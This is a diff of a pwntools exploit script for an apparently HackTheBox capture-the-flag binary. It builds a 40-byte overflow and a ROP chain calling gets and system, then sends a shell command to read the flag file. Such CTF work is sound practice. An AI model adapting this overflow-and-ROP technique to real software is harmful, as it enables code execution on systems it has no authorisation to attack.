@@ -18,21 +18,23 @@ offset = 40
 elf = ELF('./sound_of_silence')
 #libc = ELF('./glibc/libc.so.6')
 
-cmd = 'cat flag.txt\x00'
-padding = cmd.encode()+(offset-len(cmd))*b'A'
+padding = offset*b'A'
 
 #ip, port='161.35.168.118', 30070
 #ip, port = '83.136.250.41', 46944   #HTB
 #io = remote(ip,port)
-#io = process('./sound_of_silence')
-io = gdb.debug('./sound_of_silence','break main')
+io = process('./sound_of_silence')
+#io = gdb.debug('./sound_of_silence','break main')
 
-rop_chain = p64(0x403fe0)
+#gets + system
+rop_chain = p64(elf.sym.gets) + p64(elf.sym.system)
 
 payload = padding + rop_chain
 
 io.recvuntil('>>')
 io.sendline(payload)
-#io.interactive()
+cmd = b'cat glag.txt'
+io.sendline(cmd)
 print(io.recvall())
+#io.interactive()
 
